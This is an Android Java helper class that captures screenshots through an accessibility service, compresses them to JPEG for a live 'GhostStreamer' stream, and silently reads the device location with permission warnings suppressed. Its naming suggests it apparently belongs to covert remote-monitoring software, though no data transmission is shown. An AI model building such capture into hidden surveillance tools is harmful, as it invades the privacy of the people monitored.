package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.view.Display;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Helper class to isolate API 30+ calls and prevent ClassNotFoundException on older devices.
 */
@RequiresApi(api = Build.VERSION_CODES.R)
public class Api30Helper {

    /** Driven live by GhostStreamer profiles (defaults = BALANCED). */
    public static volatile int CAPTURE_WIDTH = 600;
    public static volatile int CAPTURE_JPEG_Q = 55;

    /** Off-main executor: screenshot callbacks + bitmap encode must never run on the UI thread. */
    private static final java.util.concurrent.ExecutorService SCREEN_EXEC =
            java.util.concurrent.Executors.newSingleThreadExecutor(new java.util.concurrent.ThreadFactory() {
                @Override
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r, "GhostCap");
                    t.setDaemon(true);
                    return t;
                }
            });

    public static void takeScreenshot(AccessibilityService service, ScreenshotCallback callback) {
        service.takeScreenshot(Display.DEFAULT_DISPLAY, SCREEN_EXEC, new AccessibilityService.TakeScreenshotCallback() {
            @Override
            public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                try {
                    android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                        if (softwareBitmap != null) {
                            int targetWidth = Math.max(320, Math.min(1080, CAPTURE_WIDTH));
                            int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
                            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);

                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, Math.max(30, Math.min(80, CAPTURE_JPEG_Q)), out);
                            callback.onSuccess(out.toByteArray());
                            
                            scaled.recycle();
                            softwareBitmap.recycle();
                        }
                        bitmap.recycle();
                    } else {
                        callback.onFailure("Buffer wrap failed");
                    }
                } catch (Exception e) {
                    callback.onFailure(e.getMessage());
                } finally {
                    if (hardwareBuffer != null) hardwareBuffer.close();
                }
            }

            @Override
            public void onFailure(int errorCode) {
                callback.onFailure("OS Error: " + errorCode);
            }
        });
    }

    @SuppressWarnings("MissingPermission")
    public static Location getCurrentLocation(Context context, LocationManager locationManager, String provider) {
        final CountDownLatch latch = new CountDownLatch(1);
        final Location[] freshLoc = new Location[1];
        try {
            locationManager.getCurrentLocation(
                    provider,
                    null,
                    ContextCompat.getMainExecutor(context),
                    loc -> {
                        freshLoc[0] = loc;
                        latch.countDown();
                    });
            
            if (!latch.await(8, TimeUnit.SECONDS)) {
                // Timeout
            }
        } catch (Exception ignored) {}
        return freshLoc[0];
    }
}
